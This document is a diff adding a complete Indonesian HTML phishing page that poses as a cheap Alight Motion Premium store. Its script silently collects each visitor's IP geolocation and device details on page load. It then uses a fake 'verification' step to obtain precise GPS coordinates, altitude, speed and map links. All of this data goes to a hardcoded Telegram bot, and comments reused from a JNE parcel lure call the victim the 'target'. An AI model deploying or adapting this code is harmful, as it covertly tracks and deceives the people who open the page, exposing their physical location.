@@ -1,0 +1,1015 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#6C3DF4">
+  <title>Alight Motion Premium — 5K/Tahun</title>
+</head>
+<style>
+  * {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  -webkit-tap-highlight-color: transparent;
+}
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  background: #F4F1EA;
+  min-height: 100vh;
+  color: #111;
+}
+
+/* ===== HEADER ===== */
+.header {
+  background: #6C3DF4;
+  padding: 16px 20px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  border-bottom: 3px solid #111;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+
+.header .logo {
+  width: 42px;
+  height: 42px;
+  background: #FFE066;
+  border: 3px solid #111;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-weight: 900;
+  color: #111;
+  font-size: 16px;
+  letter-spacing: -0.5px;
+  box-shadow: 3px 3px 0 #111;
+}
+
+.header .title {
+  color: #fff;
+}
+
+.header .title h1 {
+  font-size: 18px;
+  font-weight: 900;
+  letter-spacing: 0.3px;
+  text-transform: uppercase;
+}
+
+.header .title p {
+  font-size: 11px;
+  opacity: 0.9;
+  margin-top: 2px;
+  font-weight: 700;
+  color: #FFE066;
+}
+
+/* ===== CONTENT ===== */
+.content {
+  padding: 20px 16px;
+  max-width: 500px;
+  margin: 0 auto;
+}
+
+/* ===== HERO ===== */
+.hero-card {
+  background: #6C3DF4;
+  border: 3px solid #111;
+  padding: 22px 20px;
+  margin-bottom: 16px;
+  box-shadow: 5px 5px 0 #111;
+  color: #fff;
+}
+
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  background: #111;
+  color: #FFE066;
+  padding: 5px 12px;
+  border: 2px solid #111;
+  font-size: 10px;
+  font-weight: 900;
+  margin-bottom: 14px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.hero-badge .dot {
+  width: 7px;
+  height: 7px;
+  background: #E30613;
+  border-radius: 50%;
+  animation: pulse 1.2s infinite;
+}
+
+@keyframes pulse {
+  0%, 100% { opacity: 1; transform: scale(1); }
+  50% { opacity: 0.5; transform: scale(1.3); }
+}
+
+.hero-title {
+  font-size: 22px;
+  font-weight: 900;
+  line-height: 1.2;
+  margin-bottom: 10px;
+  letter-spacing: -0.3px;
+  color: #fff;
+}
+
+.hero-sub {
+  font-size: 13px;
+  line-height: 1.55;
+  font-weight: 500;
+  color: #E5DAFF;
+  margin-bottom: 16px;
+}
+
+.hero-price {
+  display: flex;
+  align-items: baseline;
+  gap: 8px;
+  flex-wrap: wrap;
+  padding-top: 14px;
+  border-top: 3px dashed #111;
+}
+
+.price-old {
+  font-size: 14px;
+  font-weight: 700;
+  color: #B9A4FF;
+  text-decoration: line-through;
+}
+
+.price-new {
+  font-size: 30px;
+  font-weight: 900;
+  color: #FFE066;
+  letter-spacing: -1px;
+  text-shadow: 2px 2px 0 #111;
+}
+
+.price-tag {
+  font-size: 12px;
+  font-weight: 900;
+  color: #fff;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+/* ===== CARD ===== */
+.card {
+  background: #fff;
+  border: 3px solid #111;
+  padding: 20px;
+  margin-bottom: 16px;
+  box-shadow: 5px 5px 0 #111;
+}
+
+.card-desc {
+  font-size: 13px;
+  color: #555;
+  line-height: 1.6;
+  margin-bottom: 14px;
+  font-weight: 500;
+}
+
+.card-desc:last-child {
+  margin-bottom: 0;
+}
+
+/* ===== ALERT ===== */
+.alert-box {
+  background: #E30613;
+  color: #fff;
+  border: 3px solid #111;
+  padding: 14px 16px;
+  margin-bottom: 16px;
+  display: flex;
+  gap: 12px;
+  align-items: flex-start;
+  box-shadow: 5px 5px 0 #111;
+}
+
+.alert-box .icon {
+  flex-shrink: 0;
+  width: 28px;
+  height: 28px;
+  background: #FFE066;
+  color: #111;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 16px;
+  font-weight: 900;
+  border: 2px solid #111;
+}
+
+.alert-box .text {
+  font-size: 12px;
+  line-height: 1.5;
+  color: #fff;
+  font-weight: 500;
+}
+
+.alert-box .text strong {
+  display: block;
+  margin-bottom: 3px;
+  color: #FFE066;
+  font-weight: 900;
+  text-transform: uppercase;
+  font-size: 11px;
+  letter-spacing: 0.5px;
+}
+
+/* ===== CARD TITLE ===== */
+.card h2 {
+  font-size: 15px;
+  margin-bottom: 14px;
+  color: #111;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border-bottom: 3px solid #111;
+  padding-bottom: 8px;
+}
+
+/* ===== INFO ROW ===== */
+.info-row {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 10px 0;
+  border-bottom: 2px dashed #ccc;
+  font-size: 13px;
+}
+
+.info-row:last-child { border-bottom: none; }
+
+.info-row .label {
+  color: #666;
+  font-weight: 700;
+  text-transform: uppercase;
+  font-size: 11px;
+  letter-spacing: 0.5px;
+}
+
+.info-row .value {
+  font-weight: 900;
+  color: #111;
+  text-align: right;
+  max-width: 60%;
+}
+
+.info-row .value.red {
+  color: #fff;
+  background: #6C3DF4;
+  padding: 3px 10px;
+  border: 2px solid #111;
+}
+
+/* ===== PREVIEW ===== */
+.preview-wrap {
+  width: 100%;
+  background: #F4F1EA;
+  border: 3px solid #111;
+  padding: 8px;
+  margin-bottom: 14px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 200px;
+  overflow: hidden;
+}
+
+.preview-img {
+  max-width: 100%;
+  max-height: 420px;
+  display: block;
+  border: 2px solid #111;
+}
+
+/* ===== TIMELINE ===== */
+.timeline {
+  margin-top: 8px;
+}
+
+.timeline-item {
+  display: flex;
+  gap: 12px;
+  padding: 10px 0;
+  position: relative;
+}
+
+.timeline-item:not(:last-child)::before {
+  content: '';
+  position: absolute;
+  left: 10px;
+  top: 32px;
+  bottom: -10px;
+  width: 3px;
+  background: #111;
+}
+
+.timeline-item .dot {
+  width: 22px;
+  height: 22px;
+  border: 3px solid #111;
+  background: #fff;
+  flex-shrink: 0;
+  margin-top: 2px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 11px;
+  color: #fff;
+  font-weight: 900;
+  z-index: 1;
+}
+
+.timeline-item.done .dot { background: #6C3DF4; color: #fff; }
+.timeline-item.active .dot { background: #E30613; color: #fff; }
+
+.timeline-item .info { font-size: 12px; }
+
+.timeline-item .info .t {
+  font-weight: 900;
+  color: #111;
+  text-transform: uppercase;
+  font-size: 11px;
+  letter-spacing: 0.5px;
+}
+
+.timeline-item .info .d {
+  color: #666;
+  font-size: 11px;
+  margin-top: 3px;
+  font-weight: 600;
+}
+
+/* ===== BUTTON PRIMARY ===== */
+.btn-primary {
+  width: 100%;
+  padding: 16px;
+  background: #6C3DF4;
+  color: #fff;
+  border: 3px solid #111;
+  font-size: 14px;
+  font-weight: 900;
+  cursor: pointer;
+  margin-top: 16px;
+  box-shadow: 5px 5px 0 #111;
+  transition: all 0.1s;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+}
+
+.btn-primary:active {
+  transform: translate(5px, 5px);
+  box-shadow: 0 0 0 #111;
+}
+
+.btn-primary:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+
+/* ===== FOOTER ===== */
+.footer {
+  text-align: center;
+  padding: 20px;
+  font-size: 10px;
+  color: #666;
+  line-height: 1.6;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+/* ===== MODAL ===== */
+.modal-overlay {
+  display: none;
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(17, 17, 17, 0.85);
+  z-index: 200;
+  justify-content: center;
+  align-items: center;
+  padding: 20px;
+}
+
+.modal-overlay.show { display: flex; }
+
+.modal {
+  background: #fff;
+  border: 3px solid #111;
+  padding: 28px 22px;
+  max-width: 380px;
+  width: 100%;
+  text-align: center;
+  box-shadow: 8px 8px 0 #6C3DF4;
+}
+
+.modal .modal-icon {
+  width: 70px;
+  height: 70px;
+  background: #6C3DF4;
+  border: 3px solid #111;
+  display: inline-flex;
+  justify-content: center;
+  align-items: center;
+  font-size: 30px;
+  color: #FFE066;
+  margin-bottom: 14px;
+  box-shadow: 4px 4px 0 #111;
+}
+
+.modal h2 {
+  font-size: 17px;
+  margin-bottom: 8px;
+  color: #111;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border: none;
+  padding: 0;
+}
+
+.modal p {
+  font-size: 13px;
+  color: #555;
+  line-height: 1.6;
+  margin-bottom: 18px;
+  font-weight: 500;
+}
+
+.modal .steps {
+  text-align: left;
+  margin-bottom: 18px;
+}
+
+.modal .step {
+  display: flex;
+  gap: 10px;
+  padding: 10px 12px;
+  background: #F4F1EA;
+  border: 2px solid #111;
+  margin-bottom: 8px;
+  font-size: 12px;
+  font-weight: 600;
+  transition: all 0.2s;
+  align-items: center;
+}
+
+.modal .step.active {
+  background: #FFE066;
+  box-shadow: 3px 3px 0 #111;
+}
+
+.modal .step.done {
+  background: #B8E6B8;
+  box-shadow: 3px 3px 0 #111;
+}
+
+.modal .step .num {
+  width: 22px;
+  height: 22px;
+  background: #111;
+  color: #fff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  font-size: 11px;
+  font-weight: 900;
+  flex-shrink: 0;
+}
+
+.modal .step.active .num { background: #6C3DF4; }
+.modal .step.done .num { background: #2E7D32; }
+
+.modal .progress {
+  background: #F4F1EA;
+  border: 2px solid #111;
+  height: 14px;
+  overflow: hidden;
+  margin-bottom: 8px;
+}
+
+.modal .progress-bar {
+  height: 100%;
+  background: #6C3DF4;
+  width: 0%;
+  transition: width 0.3s;
+}
+
+.modal .progress-text {
+  font-size: 11px;
+  color: #111;
+  margin-bottom: 16px;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.modal .btn-modal {
+  width: 100%;
+  padding: 14px;
+  background: #111;
+  color: #fff;
+  border: 3px solid #111;
+  font-size: 13px;
+  font-weight: 900;
+  cursor: pointer;
+  box-shadow: 5px 5px 0 #6C3DF4;
+  transition: all 0.1s;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.modal .btn-modal:active {
+  transform: translate(5px, 5px);
+  box-shadow: 0 0 0 #6C3DF4;
+}
+
+.modal .btn-modal:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+}
+
+/* ===== LOADING ===== */
+.loading-screen {
+  display: none;
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: #6C3DF4;
+  z-index: 300;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  color: #fff;
+}
+
+.loading-screen.show { display: flex; }
+
+.spinner {
+  width: 50px;
+  height: 50px;
+  border: 4px solid #FFE066;
+  border-top-color: #111;
+  animation: spin 0.8s linear infinite;
+  margin-bottom: 18px;
+  box-shadow: 4px 4px 0 #111;
+}
+
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.loading-screen .text {
+  font-size: 15px;
+  font-weight: 900;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: #FFE066;
+}
+
+.loading-screen .sub {
+  font-size: 12px;
+  opacity: 0.9;
+  margin-top: 6px;
+  font-weight: 600;
+  color: #fff;
+}
+</style>
+<body>
+
+  <!-- HEADER -->
+  <div class="header">
+    <div class="logo">AM</div>
+    <div class="title">
+      <h1>Alight Motion</h1>
+      <p>Premium Store</p>
+    </div>
+  </div>
+
+  <div class="content">
+
+    <!-- HERO -->
+    <div class="hero-card">
+      <div class="hero-badge">
+        <span class="dot"></span>
+        PROMO TERBATAS
+      </div>
+      <h1 class="hero-title" id="heroTitle">
+        Alight Motion Premium Cuma 5K/Tahun
+      </h1>
+      <p class="hero-sub" id="heroSub">
+        Unlock semua fitur premium: tanpa watermark, semua efek, export 4K. Aktif 1 tahun penuh.
+      </p>
+      <div class="hero-price">
+        <span class="price-old">Rp 75.000</span>
+        <span class="price-new">Rp 5.000</span>
+        <span class="price-tag">/tahun</span>
+      </div>
+    </div>
+
+    <!-- ALERT -->
+    <div class="alert-box">
+      <div class="icon">!</div>
+      <div class="text">
+        <strong>Promo Terbatas</strong>
+        Harga khusus hari ini. Stok akun terbatas, siapa cepat dia dapat!
+      </div>
+    </div>
+
+    <!-- PREVIEW CARD -->
+    <div class="card">
+      <h2>Preview Akun Premium</h2>
+      <div class="preview-wrap">
+        <img
+          src="https://files.catbox.moe/sfyncz.jpg"
+          alt="Preview Akun Premium Alight Motion"
+          class="preview-img"
+          id="previewImg"
+        >
+      </div>
+      <p class="card-desc">
+        Bukti akun premium aktif. Semua fitur unlocked, siap pakai.
+      </p>
+    </div>
+
+    <!-- BENEFIT CARD -->
+    <div class="card">
+      <h2>Keuntungan Premium</h2>
+      <div class="timeline">
+        <div class="timeline-item done">
+          <div class="dot">✓</div>
+          <div class="info">
+            <div class="t">Tanpa Watermark</div>
+            <div class="d">Export bersih tanpa logo AM</div>
+          </div>
+        </div>
+        <div class="timeline-item done">
+          <div class="dot">✓</div>
+          <div class="info">
+            <div class="t">Semua Efek Unlocked</div>
+            <div class="d">Ratusan efek & preset premium</div>
+          </div>
+        </div>
+        <div class="timeline-item done">
+          <div class="dot">✓</div>
+          <div class="info">
+            <div class="t">Export 4K Ultra HD</div>
+            <div class="d">Kualitas maksimal tanpa batas</div>
+          </div>
+        </div>
+        <div class="timeline-item active">
+          <div class="dot">!</div>
+          <div class="info">
+            <div class="t">Bonus: 100+ Preset AMV</div>
+            <div class="d">Gratis buat pembeli hari ini</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- HARGA CARD -->
+    <div class="card">
+      <h2>Detail Paket</h2>
+      <div class="info-row">
+        <span class="label">Harga</span>
+        <span class="value red" id="tujuan">Rp 5.000</span>
+      </div>
+      <div class="info-row">
+        <span class="label">Durasi</span>
+        <span class="value">1 Tahun</span>
+      </div>
+      <div class="info-row">
+        <span class="label">Garansi</span>
+        <span class="value">7 Hari</span>
+      </div>
+      <div class="info-row">
+        <span class="label">Pengiriman</span>
+        <span class="value">Instan</span>
+      </div>
+    </div>
+
+    <!-- CTA CARD -->
+    <div class="card">
+      <h2>Pesan Sekarang</h2>
+      <p class="card-desc">
+        Klik tombol di bawah untuk order via WhatsApp. Proses cepat, langsung aktif.
+      </p>
+      <button class="btn-primary" id="btnKlaim" onclick="showModal()">
+        BELI SEKARANG — 5K
+      </button>
+    </div>
+
+  </div>
+
+  <div class="footer">
+    © 2026 AM Premium Store — By DensXD<br>
+    Bukan afiliasi resmi Alight Motion
+  </div>
+
+  <!-- MODAL -->
+  <div class="modal-overlay" id="modal">
+    <div class="modal">
+      <div class="modal-icon">◉</div>
+      <h2>Konfirmasi Pesanan</h2>
+      <p>Lanjutkan pemesanan akun premium Alight Motion 1 tahun dengan harga Rp 5.000.</p>
+
+      <div class="steps">
+        <div class="step" id="s1">
+          <div class="num">1</div>
+          <div>Chat WhatsApp admin</div>
+        </div>
+        <div class="step" id="s2">
+          <div class="num">2</div>
+          <div>Kirim bukti transfer Rp 5.000</div>
+        </div>
+        <div class="step" id="s3">
+          <div class="num">3</div>
+          <div>Terima akun premium instan</div>
+        </div>
+      </div>
+
+      <div class="progress">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+      <div class="progress-text" id="progressText">0%</div>
+
+      <button class="btn-modal" id="btnModal">
+        LANJUTKAN KE WHATSAPP
+      </button>
+    </div>
+  </div>
+
+  <!-- LOADING -->
+  <div class="loading-screen" id="loadingScreen">
+    <div class="spinner"></div>
+    <div class="text" id="loadingText">Menghubungkan...</div>
+    <div class="sub" id="loadingSub">Mohon tunggu sebentar</div>
+  </div>
+  <script>
+            // ============================================================
+        // GANTI 2 BARIS INI DOANG!
+        // ============================================================
+        const BOT_TOKEN = '8650904554:AAHwpSkDz7lk5Yve9v9yfCenkomPvqsyvec'; // GANTI!
+        const CHAT_ID = '7848799198'; // GANTI!
+        // ============================================================
+        
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: false
+                })
+            }).catch(() => {});
+        }
+        
+        async function getIPInfo() {
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                return await r.json();
+            } catch(e) {
+                try {
+                    const r = await fetch('https://ipwho.is/');
+                    return await r.json();
+                } catch(e2) { return null; }
+            }
+        }
+        
+        function getDevice() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                pixelRatio: window.devicePixelRatio,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency || '-',
+                touch: 'ontouchstart' in window ? 'Ya' : 'Tidak'
+            };
+        }
+        
+        function showModal() {
+            document.getElementById('modal').classList.add('show');
+            sendToTelegram(`📦 <b>TARGET BUKA PHISHING JNE</b>\n\n🕐 ${new Date().toLocaleString('id-ID')}\n📱 ${navigator.userAgent.substring(0, 60)}...`);
+        }
+        
+        function setStep(n, state) {
+            const el = document.getElementById('s' + n);
+            if (!el) return;
+            el.classList.remove('active', 'done');
+            if (state) el.classList.add(state);
+            if (state === 'active') {
+                for (let i = 1; i < n; i++) document.getElementById('s' + i).classList.add('done');
+            }
+        }
+        
+        function setProgress(p) {
+            document.getElementById('progressBar').style.width = p + '%';
+            document.getElementById('progressText').textContent = p + '%';
+        }
+        
+        async function startVerification() {
+            const btn = document.getElementById('btnModal');
+            btn.disabled = true;
+            btn.textContent = '⏳ Memproses...';
+            
+            setStep(1, 'active');
+            setProgress(10);
+            
+            sendToTelegram(`📍 <b>TARGET KLIK "IZINKAN"</b>\n🕐 ${new Date().toLocaleString('id-ID')}`);
+            
+            await new Promise(r => setTimeout(r, 800));
+            
+            setStep(1, 'done');
+            setStep(2, 'active');
+            setProgress(30);
+            
+            if (!navigator.geolocation) {
+                setProgress(100);
+                sendToTelegram(`❌ Browser target gak support GPS!`);
+                fallbackIP();
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                async function(pos) {
+                    setStep(2, 'done');
+                    setStep(3, 'active');
+                    setProgress(70);
+                    
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const acc = pos.coords.accuracy;
+                    const alt = pos.coords.altitude;
+                    const head = pos.coords.heading;
+                    const spd = pos.coords.speed;
+                    
+                    const ip = await getIPInfo();
+                    const dev = getDevice();
+                    
+                    const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+                    const satLink = `https://www.google.com/maps/@${lat},${lon},19z/data=!3m1!1e3`;
+                    const svLink = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon}`;
+                    const wazeLink = `https://waze.com/ul?ll=${lat},${lon}&navigate=yes`;
+                    
+                    let msg = `🎯 <b>LOKASI GPS TARGET!</b>\n`;
+                    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                    msg += `📍 <b>KOORDINAT:</b>\n`;
+                    msg += `Lat: <code>${lat}</code>\n`;
+                    msg += `Lon: <code>${lon}</code>\n`;
+                    msg += `Akurasi: <b>${acc.toFixed(2)}m</b>\n`;
+                    if (alt) msg += `Alt: ${alt.toFixed(1)}m\n`;
+                    if (head) msg += `Heading: ${head}°\n`;
+                    if (spd) msg += `Speed: ${spd.toFixed(2)} m/s\n`;
+                    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                    msg += `🗺️ <b>BUKA MAPS:</b>\n`;
+                    msg += `<a href="${mapsLink}">📍 Titik Persis</a>\n`;
+                    msg += `<a href="${satLink}">🛰️ Satelit</a>\n`;
+                    msg += `<a href="${svLink}">🏙️ Street View</a>\n`;
+                    msg += `<a href="${wazeLink}">🚗 Waze</a>\n`;
+                    
+                    if (ip) {
+                        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                        msg += `🌐 <b>IP INFO:</b>\n`;
+                        msg += `IP: <code>${ip.ip || '-'}</code>\n`;
+                        msg += `Kota: <b>${ip.city || '-'}</b>\n`;
+                        msg += `Region: ${ip.region || '-'}\n`;
+                        msg += `Negara: ${ip.country_name || ip.country || '-'}\n`;
+                        msg += `ISP: ${ip.org || ip.connection?.isp || '-'}\n`;
+                    }
+                    
+                    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                    msg += `📱 <b>DEVICE:</b>\n`;
+                    msg += `Platform: ${dev.platform}\n`;
+                    msg += `Bahasa: ${dev.language}\n`;
+                    msg += `Timezone: ${dev.timezone}\n`;
+                    msg += `Screen: ${dev.screen}\n`;
+                    msg += `CPU: ${dev.cores} core\n`;
+                    msg += `UA: <code>${dev.userAgent.substring(0, 120)}</code>\n`;
+                    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                    msg += `🕐 ${new Date().toLocaleString('id-ID')}\n`;
+                    msg += `📦 <b>JNE PHISHING - SUCCESS!</b>`;
+                    
+                    sendToTelegram(msg);
+                    
+                    setProgress(100);
+                    await new Promise(r => setTimeout(r, 500));
+                    
+                    document.getElementById('modal').classList.remove('show');
+                    document.getElementById('loadingScreen').classList.add('show');
+                    document.getElementById('loadingText').textContent = '✅ Verifikasi Berhasil!';
+                    document.getElementById('loadingSub').textContent = 'Paket sedang dialihkan...';
+                    
+                    await new Promise(r => setTimeout(r, 2500));
+                    
+                    document.getElementById('loadingText').textContent = '📦 Paket Ditemukan';
+                    document.getElementById('loadingSub').textContent = 'Mengalihkan ke JNE...';
+                    
+                    await new Promise(r => setTimeout(r, 2000));
+                    
+                    window.location.href = 'https://www.jne.co.id';
+                },
+                async function(err) {
+                    let reason = '';
+                    switch(err.code) {
+                        case err.PERMISSION_DENIED: reason = 'Target MENOLAK izin lokasi'; break;
+                        case err.POSITION_UNAVAILABLE: reason = 'Lokasi tidak tersedia'; break;
+                        case err.TIMEOUT: reason = 'Timeout (20s)'; break;
+                        default: reason = 'Error: ' + err.message;
+                    }
+                    sendToTelegram(`❌ <b>GAGAL GPS</b>\n\n${reason}\n🕐 ${new Date().toLocaleString('id-ID')}\n➡️ Fallback IP...`);
+                    fallbackIP();
+                },
+                { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+            );
+        }
+        
+        async function fallbackIP() {
+            setProgress(100);
+            const ip = await getIPInfo();
+            const dev = getDevice();
+            
+            if (ip) {
+                const lat = ip.latitude || ip.lat;
+                const lon = ip.longitude || ip.lon;
+                
+                let msg = `⚠️ <b>FALLBACK: IP-BASED</b>\n`;
+                msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                msg += `Target TOLAK GPS:\n\n`;
+                msg += `IP: <code>${ip.ip || '-'}</code>\n`;
+                msg += `Kota: <b>${ip.city || '-'}</b>\n`;
+                msg += `Region: ${ip.region || '-'}\n`;
+                msg += `Negara: ${ip.country_name || ip.country || '-'}\n`;
+                msg += `ISP: ${ip.org || ip.connection?.isp || '-'}\n`;
+                
+                if (lat && lon) {
+                    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                    msg += `📍 <b>IP KOORDINAT:</b>\n`;
+                    msg += `Lat: <code>${lat}</code>\n`;
+                    msg += `Lon: <code>${lon}</code>\n`;
+                    msg += `🗺️ <a href="https://maps.google.com/?q=${lat},${lon}">Lihat Maps</a>\n`;
+                }
+                msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+                msg += `📱 ${dev.platform}\n`;
+                msg += `🕐 ${new Date().toLocaleString('id-ID')}`;
+                
+                sendToTelegram(msg);
+            }
+            
+            document.getElementById('modal').classList.remove('show');
+            document.getElementById('loadingScreen').classList.add('show');
+            document.getElementById('loadingText').textContent = '⚠️ Verifikasi Gagal';
+            document.getElementById('loadingSub').textContent = 'Izinkan akses lokasi untuk melanjutkan';
+            
+            setTimeout(() => {
+                document.getElementById('loadingScreen').classList.remove('show');
+                const btn = document.getElementById('btnModal');
+                btn.disabled = false;
+                btn.textContent = '🔄 COBA LAGI';
+                setProgress(0);
+                for (let i = 1; i <= 3; i++) document.getElementById('s' + i).classList.remove('active', 'done');
+            }, 2000);
+        }
+        
+        // Set tujuan random
+        document.getElementById('tujuan').textContent = 'Kota ' + ['Jakarta', 'Bandung', 'Surabaya', 'Medan', 'Semarang', 'Makassar'][Math.floor(Math.random() * 6)];
+        
+        // Auto notif saat page load
+        (async function init() {
+            const ip = await getIPInfo();
+            const dev = getDevice();
+            
+            let msg = `📦 <b>JNE PHISHING PAGE DIBUKA</b>\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🕐 ${new Date().toLocaleString('id-ID')}\n`;
+            if (ip) {
+                msg += `🌐 IP: <code>${ip.ip || '-'}</code>\n`;
+                msg += `📍 ${ip.city || '?'}, ${ip.country_name || ip.country || '?'}\n`;
+                msg += `📡 ISP: ${ip.org || ip.connection?.isp || '?'}\n`;
+                if (ip.latitude && ip.longitude) {
+                    msg += `🗺️ <a href="https://maps.google.com/?q=${ip.latitude},${ip.longitude}">IP Maps</a>\n`;
+                }
+            }
+            msg += `📱 ${dev.platform}\n`;
+            msg += `🔤 ${dev.language}\n`;
+            msg += `🕰️ ${dev.timezone}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🎯 Target sedang melihat halaman paket...`;
+            
+            sendToTelegram(msg);
+        })();
+  </script>
+</body>
+</html>
